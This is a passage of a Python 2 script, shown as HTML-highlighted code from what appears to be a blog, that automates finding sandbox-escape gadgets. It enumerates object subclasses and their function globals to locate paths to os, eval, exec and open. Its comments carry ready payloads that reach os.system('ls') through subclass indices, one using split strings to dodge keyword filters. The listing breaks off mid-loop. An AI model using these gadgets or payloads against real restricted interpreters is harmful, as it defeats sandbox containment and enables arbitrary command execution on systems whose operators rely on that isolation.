class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding=UTF-8</span></div><div class="line"><span class="comment"># Python2</span></div><div class="line"></div><div class="line">find_modules = &#123;<span class="string">'filecmp'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'heapq'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'code'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'hotshot'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'distutils'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'functools'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'random'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tty'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'subprocess'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'sysconfig'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'whichdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'runpy'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pty'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plat-atheos'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'xml'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sgmllib'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'importlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserList'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tempfile'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'mimify'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pprint'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'platform'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'collections'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'cProfile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'smtplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'compiler'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</div><div class="line">                <span class="string">'string'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'SocketServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plat-darwin'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'zipfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'repr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'wave'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'curses'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'antigravity'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-irix6'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plat-freebsd6'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-freebsd7'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plat-freebsd4'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-freebsd5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plat-freebsd8'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'aifc'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'sndhdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cookielib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ConfigParser'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'httplib'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_MozillaCookieJar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'bisect'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'decimal'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cmd'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'binhex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sunau'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'pydoc'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-riscos'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'token'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'Bastion'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'msilib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'shlex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'quopri'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'multiprocessing'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'dummy_threading'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'dircache'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'asyncore'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'pkgutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'compileall'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'SimpleHTTPServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'locale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'chunk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'macpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'popen2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'mimetypes'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'toaiff'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'atexit'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pydoc_data'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'tabnanny'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'HTMLParser'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'encodings'</span>: [<span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'BaseHTTPServer'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'calendar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailcap'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plat-unixware7'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'abc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plistlib'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'bdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'py_compile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</div><div class="line">                <span class="string">'pipes'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'rfc822'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'tarfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'struct'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'urllib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fpformat'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'re'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>], <span class="string">'mutex'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'ntpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserString'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'new'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'formatter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'email'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'cgi'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'ftplib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plat-linux2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'ast'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'optparse'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserDict'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'inspect'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailbox'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'Queue'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'fnmatch'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ctypes'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'codecs'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'getopt'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'md5'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'cgitb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'commands'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'logging'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'socket'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plat-irix5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sre'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</div><div class="line">                <span class="string">'ensurepip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'DocXMLRPCServer'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'traceback'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'netrc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'wsgiref'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plat-generic'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'weakref'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'ihooks'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'telnetlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'doctest'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pstats'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'smtpd'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_pyio'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'dis'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'os'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'pdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'this'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'base64'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'os2emxpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'glob'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'unittest'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dummy_thread'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'fileinput'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'__future__'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'robotparser'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-mac'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'_threading_local'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_LWPCookieJar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'wsgiref.egg-info'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sha'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'sre_constants'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'json'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'Cookie'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'tokenize'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-beos5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'rexec'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib-tk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'textwrap'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'fractions'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sqlite3'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'posixfile'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'imaplib'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'xdrlib'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'imghdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'macurl2path'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'_osx_support'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'webbrowser'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'plat-netbsd1'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'nturl2path'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'tkinter'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copy'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'pickletools'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'hashlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'anydbm'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'keyword'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'timeit'</span>: [<span class="string">'timeit'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'uu'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'StringIO'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'modulefinder'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'stringprep'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'markupbase'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'colorsys'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'shelve'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'multifile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sre_parse'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'pickle'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-os2emx'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'mimetools'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'audiodev'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copy_reg'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'sre_compile'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>], <span class="string">'CGIHTTPServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'idlelib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'site'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'getpass'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'imputil'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'bsddb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'contextlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'numbers'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'io'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'plat-sunos5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'symtable'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'pyclbr'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'shutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib2to3'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dbhash'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'gettext'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'dumbdbm'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</div><div class="line">                <span class="string">'_weakrefset'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_abcoll'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'MimeWriter'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'test'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'opcode'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'csv'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'nntplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'profile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'genericpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'stat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'__phello__.foo'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'sched'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'statvfs'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'trace'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'warnings'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'symbol'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sets'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'htmlentitydefs'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urllib2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'SimpleXMLRPCServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sunaudio'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'pdb.doc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'asynchat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'user'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'xmllib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'codeop'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-next3'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'types'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'argparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'uuid'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'plat-aix4'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-aix3'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'ssl'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'poplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'xmlrpclib'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'difflib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urlparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'linecache'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'_strptime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'htmllib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'site-packages'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'posixpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'stringold'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'gzip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'mhlib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'rlcompleter'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'hmac'</span>: [<span class="string">'__builtins__'</span>]&#125;</div><div class="line"></div><div class="line">target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</div><div class="line">target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</div><div class="line"></div><div class="line">all_targets = list(set(find_modules.keys() + target_modules + target_functions))</div><div class="line">all_modules = list(set(find_modules.keys() + target_modules))</div><div class="line"></div><div class="line">subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</div><div class="line">sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</div><div class="line"></div><div class="line"><span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span></div><div class="line">print(<span class="string">'----------1-----------'</span>)</div><div class="line"><span class="keyword">for</span> i, s <span class="keyword">in</span> enumerate(sub_name):</div><div class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</div><div class="line">        <span class="keyword">if</span> f == s:</div><div class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</div><div class="line">                print(i, f)</div><div class="line">            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</div><div class="line">                target = find_modules[f]</div><div class="line">                sub_dict = subclasses[i].__dict__</div><div class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> target:</div><div class="line">                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</div><div class="line">                        print(i, f, target)</div><div class="line"></div><div class="line">print(<span class="string">'----------2-----------'</span>)</div><div class="line"><span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')</span></div><div class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        more = sub.__init__.func_globals</div><div class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</div><div class="line">            <span class="keyword">if</span> m <span class="keyword">in</span> more:</div><div class="line">                print(i, sub, m, find_modules.get(m))</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line">print(<span class="string">'----------3-----------'</span>)</div><div class="line"><span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("ls")')</span></div><div class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        more = sub.__init__.func_globals.values()</div><div class="line">        <span class="keyword">for</span> j, v <span class="keyword">in</span> enumerate(more):</div><div class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    <span class="keyword">if</span> f <span class="keyword">in</span> v:</div><div class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</div><div class="line">                            print(i, j, sub, f)</div><div class="line">                        <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</div><div class="line">                            target = find_modules.get(f)</div><div class="line">                            sub_dict = v[f].__dict__</div><div class="line">                            <span class="keyword">for</span> t <span class="keyword">in</span> target:</div><div class="line">                                <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</div><div 